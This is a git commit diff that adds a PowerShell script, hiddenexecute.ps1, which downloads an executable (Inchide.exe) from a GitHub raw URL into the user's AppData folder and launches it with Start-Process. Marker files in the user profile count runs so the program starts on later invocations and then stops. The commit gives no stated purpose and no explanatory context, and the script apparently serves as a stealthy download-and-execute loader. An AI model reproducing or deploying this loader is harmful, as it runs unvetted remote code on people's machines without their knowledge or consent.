208245072fa928124ab304b989bb4a3c77a8b71a
webntdev <96979468+webntdev@users.noreply.github.com>
2024-05-23 11:25:37 +0300

    Update hiddenexecute.ps1

--- files/hiddenexecute.ps1
+++ files/hiddenexecute.ps1
@@ -1,1 +1,20 @@
-Exit
+$x = "https://github.com/webntdev/webntdev.github.io/raw/main/Inchide/Inchide.exe"
+$y = "$env:USERPROFILE\AppData\Local\inchide.exe"
+
+if (Test-Path "$env:USERPROFILE\EXITR2.txt") {
+    exit
+}
+
+New-Item -Path "$env:USERPROFILE\H123R2.txt" -ItemType "file"
+
+if (Test-Path "$env:USERPROFILE\H360R2.txt") {
+    New-Item -Path "$env:USERPROFILE\EXITR2.txt" -ItemType "file"
+    Start-Process $y
+}
+
+if (Test-Path "$env:USERPROFILE\H123R2.txt") {
+    New-Item -Path "$env:USERPROFILE\H360R2.txt" -ItemType "file"
+    Start-Process $y
+}
+
+Invoke-WebRequest -Uri $x -OutFile $y
